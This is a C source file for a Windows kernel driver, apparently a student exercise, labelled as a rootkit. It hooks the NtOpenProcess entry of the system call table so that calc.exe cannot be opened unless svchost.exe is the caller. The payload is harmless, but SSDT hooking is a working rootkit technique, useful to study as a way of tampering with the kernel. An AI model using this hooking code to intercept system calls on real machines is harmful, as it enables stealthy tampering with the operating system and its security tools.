#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook" 

// Rootkit :

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable; // symbole exporte par le noyau pour lire la ssdt

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
int IsHooked;

typedef struct ProcessInformation{
	ULONG pid;
	ULONG ppid;
	UCHAR *name;
	PUNICODE_STRING pathname;
} ProcessInformation;


NTSTATUS ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI NtOpenProcess(

);

typedef NTSTATUS (*NTOPENPROCESS)(
   PHANDLE            ProcessHandle,
   ACCESS_MASK        DesiredAccess,
   POBJECT_ATTRIBUTES ObjectAttributes,
   PCLIENT_ID         ClientId
);


NTOPENPROCESS OldNtOpenProcess;

PVOID getProcessName(HANDLE ProcessHandle)
{	
	ULONG ret;
	NTSTATUS rc_zw;
	PVOID unicode;
	UNICODE_STRING name;

	rc_zw = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, NULL, 0, &ret);
	if (rc_zw == STATUS_INFO_LENGTH_MISMATCH)
	{
		unicode = ExAllocatePoolWithTag(PagedPool, ret, 'Efe');
		if (unicode != NULL)
		{
			rc_zw = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, unicode, ret, &ret);
			if (NT_SUCCESS(rc_zw))
			{
				return unicode;
			}
		}
	}
	return NULL;
}


NTSTATUS NewNtOpenProcess(
   PHANDLE            ProcessHandle,
   ACCESS_MASK        DesiredAccess,
   POBJECT_ATTRIBUTES ObjectAttributes,
   PCLIENT_ID         ClientId
)
{
	UNICODE_STRING calcName, svchostName;
	PVOID parentProcess, childProcess;
	PUNICODE_STRING parentName, childName;
	NTSTATUS rc;

	rc = (*OldNtOpenProcess) (
		ProcessHandle, 
		DesiredAccess, 
		ObjectAttributes, 
		ClientId
	);
	
	RtlInitUnicodeString(&svchostName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe"); 
	RtlInitUnicodeString(&calcName, L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe");   	
				
	parentProcess = getProcessName(ZwCurrentProcess());
	childProcess = getProcessName(*ProcessHandle);

	if (parentProcess != NULL && childProcess != NULL)
	{
		parentName = (PUNICODE_STRING) parentProcess;
		childName = (PUNICODE_STRING) childProcess;

		if (RtlCompareUnicodeString(parentProcess, &svchostName, TRUE) != 0 && RtlCompareUnicodeString(childProcess, &calcName, TRUE) == 0)
		{
			DbgPrint("BLOCK ====> Parent: %wZ, Child: %wZ\n", parentName, childName);
			ExFreePoolWithTag(parentProcess, 'Efe');
			ExFreePoolWithTag(childProcess, 'Efe');
			return STATUS_ACCESS_DENIED;
		}
		else if (RtlCompareUnicodeString(parentProcess, &svchostName, TRUE) == 0 && RtlCompareUnicodeString(childProcess, &calcName, TRUE) == 0)
		{
			DbgPrint("Caller proc. PID: %ld\n", PsGetCurrentProcessId());
			DbgPrint("KEEPING ====> Parent: %wZ, Child: %wZ\n", parentName, childName); 
		} 
	}

	if (parentProcess != NULL)
		ExFreePoolWithTag(parentProcess, 'Efe');
	if (childProcess != NULL)
		ExFreePoolWithTag(childProcess, 'Efe');

	return rc;
}


NTSTATUS Hook_Function()
{
	g_pmdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldNtOpenProcess = (PVOID) InterlockedExchange(  
			(PLONG) &MappedSystemCallTable[190], 
			(LONG) NewNtOpenProcess 
		);
		IsHooked = 1; 
		DbgPrint("DriverEntry: Hook success");
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}

 
void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( 
			(PLONG) &MappedSystemCallTable[190],
			(LONG) OldNtOpenProcess
		);
		IsHooked = 0;
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}
 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	if(IsHooked)
		Unhook_fonction();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master 2\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;

	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;

	Hook_Function();

	return STATUS_SUCCESS;	
}

